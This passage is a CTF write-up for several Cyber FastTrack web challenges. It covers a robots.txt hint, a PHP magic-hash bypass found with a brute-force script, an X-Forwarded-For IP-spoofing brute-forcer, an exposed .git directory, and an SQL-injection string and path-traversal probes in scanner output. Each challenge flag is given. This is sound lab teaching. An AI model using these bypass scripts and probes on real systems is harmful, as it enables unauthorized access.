We could use a tool such as [Dirsearch](https://github.com/maurosoria/dirsearch) to find the secret link, but since this was an easy challenge I had a hunch that it was probably `/robots.txt`. So let's take a look at `/robots.txt`:

```
User-agent: \*

Allow: /
Disallow: /4ext6b6.html
```

Ah, it looks we've found another page. Let's navigate there:

![](/assets/img/writeups/CyberFastTrackSpring2021/WE02%20Writeup.003.png)

Nice and easy challenge. Always a good idea to check out `/robots.txt` during CTF competitions.

### Flag: Shhh_robot_you_said_too_much!

----------------------------------------------------------------------------

### Challenge: WM03
### Category: Web (Medium)

## Description:
#### [250 pts]: Visit the site at [https://cfta-wm03.allyourbases.co](https://cfta-wm03.allyourbases.co) and find a way to bypass the password check.

## Walkthrough:
Navigating to the provided URL, we're presented with a page that asks for a password:

![](/assets/img/writeups/CyberFastTrackSpring2021/WM03%20Writeup.001.png)

At first, I tried simple SQL injections such as `' or 1=1 --` and other variations but this didn't lead me anywhere. So the next thing I tried was looking at the page source, where I found an interesting comment with the following code:

```php
TODO: remove, taken from OSS project, login contains:
return function ($event) {
    require_once("flag.php");
    $hash = "0e747135815419029880333118591372";
    $salt = "e361bfc569ba48dc";
        if (isset($event['password']) && is_string($event['password'])) {
            if (md5($salt . $event['password']) == $hash) {
                return $flag;
            }
        }
        return "Incorrect";
    };
```

So it looks like we're looking for a password that when MD5 hashed with the salt `e361bfc569ba48dc` will equal `0e747135815419029880333118591372`. 

There is a rather well known and interesting programming mistake that can be found in PHP which is centered around using a loose comparison (==). Since in a loose comparison only the value and not the type of the variable is checked, the value `0e747135815419029880333118591372` will be equal to 0. This is because in PHP you can use `e` to represent numbers in E notation (i.e 10e1 = 10 * 10^1 = 100).

Cool, so we have a good understanding of the vulnerability now. I crafted the following script to find a password that when hashed will begin with `0e` and thus equal the goal hash:

```php
<?php
$i = 0; // our password

// while the md5 hash of the salt + our password != the goal hash
do{
    $i++; // increment our password by 1
} while(md5("e361bfc569ba48dc".strval($i)) != "0e747135815419029880333118591372");
echo $i; // echo the password when they're equal
?>
```

Running the script and waiting a few seconds we get our password: `15896119`. Using this password we get the flag:

![](/assets/img/writeups/CyberFastTrackSpring2021/WM03%20Writeup.002.png)

### Flag: theLOOSEtheMATH&theTRUTHY

----------------------------------------------------------------------------

### Challenge: WH01
### Category: Web (Hard)

## Description:
#### [500 pts]: Access the site at https://cfta-wh01.allyourbases.co and find a way to get the flag from the CMS.

## Walkthrough:
Navigating to the provided URL, we're presented with a simple blog page:

![](/assets/img/writeups/CyberFastTrackSpring2021/WH01%20Writeup.001.png)

Doing the standard things such as looking at the page source and analyzing the requests to the site didn't show anything interesting. So let's use [Dirsearch](https://github.com/maurosoria/dirsearch) to see if we can find any hidden directories/files:

`python3 dirsearch.py -u https://ctfa-wh01.allyourbases.co/ -e .html`

```bash
  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: html | HTTP method: GET | Threads: 30 | Wordlist size: 8913

Error Log: /media/sf_CTFs/CyberFastTrack/Web/WH01/dirsearch/logs/errors-21-04-07_16-05-25.log

Target: https://cfta-wh01.allyourbases.co/

Output File: /media/sf_CTFs/CyberFastTrack/Web/WH01/dirsearch/reports/cfta-wh01.allyourbases.co/_21-04-07_16-05-25.txt

[16:05:25] Starting: 
[16:05:27] 400 -    0B  - /..;/
[16:05:36] 200 -   16B  - /404.html
[16:05:40] 400 -    0B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[16:05:42] 304 -    0B  - /admin.html
[16:05:58] 200 -  616B  - /index.html
[16:06:08] 200 -  154B  - /readme.txt
[16:06:09] 400 -  371B  - /servlet/%C0%AE%C0%AE%C0%AF
[16:06:10] 200 -    0B  - /soap/
```

Nice, we found some hidden files! `/admin.html` is pretty interesting but if you navigate to it, you will find that it is just a blank page. So let's take a look at `/readme.txt`:

```
To use the CMS make sure to visit /admin.html from allowed IPs on the local network.

Note: Tell engineering to stop moving the subnet from 192.168.0.0/24
```

It seems that in order for us to access `/admin.html` we need to trick the server into believing that we are coming from a local IP in the `192.168.0.0/24` range.

We can accomplish this by adding the [`X-Forwarded-For`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For) HTTP header and setting it to a local IP. However, if we just try an IP such as `192.168.0.1` we still get a blank page from `/admin.html`. So we need to find a specific IP that the server will recognize is on the local network.

I accomplished this by creating a script that would bruteforce all of the IPs:

```python
import requests

url = 'https://cfta-wh01.allyourbases.co/admin.html'

ip = 0

while True:
    print("Trying", f"192.168.0.{ip}")
    r = requests.get(url,headers={"X-Forwarded-For":f"192.168.0.{ip}"})

    if 'flag' in r.text:
        print(r.text)
        break

    ip +=1
```

Running the script we find a valid IP to be `192.168.0.62` and we get the flag

### Flag: iPSpooFinGWiThHopHeaDers91918

----------------------------------------------------------------------------

### Challenge: WH02 
### Category: Web (Hard)

## Description:
#### [500 pts]: Access the site at [https://cfta-wh02.allyourbases.co](https://cfta-wh02.allyourbases.co) and find a way to get the flag.

## Walkthrough:
Navigating to the provided URL, we're presented the following page:

![](/assets/img/writeups/CyberFastTrackSpring2021/WH02%20Writeup.001.png)

During the competition the "Use version control!" bullet caught my eye and made me immediately think of a misconfiguration in which websites leave their `.git` directory publicly accesible. Since Git is a widely used version control system for all kinds of software projects this means an attacker could potentially obtain information that they otherwise wouldn't be able to find such as keys or passwords.

If for some reason, I did not think of this at the time, I could've found the directory using a tool such as [Dirsearch](https://github.com/maurosoria/dirsearch).

Let's try navigating to `/.git`:

![](/assets/img/writeups/CyberFastTrackSpring2021/WH02%20Writeup.002.png)

Sure enough! Let's use `wget` to recursively download all of the files:

`wget -r https://cfta-wh02.allyourbases.co/.git/`

Now that we have the `.git` directory, we can open it up in a Git client such as Github Desktop and look at the commit history. Doing so, we find the file `setup.sh` that was committed on Mar 7, 2021, which contains the flag:

![](/assets/img/writeups/CyberFastTrackSpring2021/WH02%20Writeup.003.png)

As a side note, you could also find the flag by using the following syntax `git cat-file -p [object]`. So, you could print the master object found in `.git/refs/heads/master`, then the parent object, then the tree, and finally the `setup.sh` object:

```bash
.../.git/refs/heads$ git cat-file -p master

tree 7b45022b9625c4ff304c7889aa347c14a783d526
parent 80e789704ddca67d772dbc34de1088e8c1917e9d
author Joe Bloggs <j.bloggs@allyourbases.io> 1615149654 -0800
committer Joe Bloggs <j.bloggs@allyourbases.io> 1615149654 -0800

Production version.

.../.git/refs/heads$ git cat-file -p 80e789704ddca67d772dbc34de1088e8c1917e9d

tree 41d13ed4347b3165f04206816551c2db2e85362f
author Joe Bloggs <j.bloggs@allyourbases.io> 1615149294 -0800
committer Joe Bloggs <j.bloggs@allyourbases.io> 1615149294 -0800

Testing a few things.

.../.git/refs/heads$ git cat-file -p 41d13ed4347b3165f04206816551c2db2e85362f
100644 blob 29a14289852c096391cf9d2cd3de8907056b35f3    index.html
100644 blob dc5e9b1b5e6133b2c1d537010f9ea24285dbd961    setup.sh

.../.git/refs/heads$ git cat-file -p dc5e9b1b5e6133b2c1d537010f9ea24285dbd961
#!/bin/bash

FLAG="giTisAGreat_ResoURCe8337"

cd build
cp ../sitedata.zip sitedata.zip
unzip sitedata.zip
```

### Flag: giTisAGreat_ResoURCe8337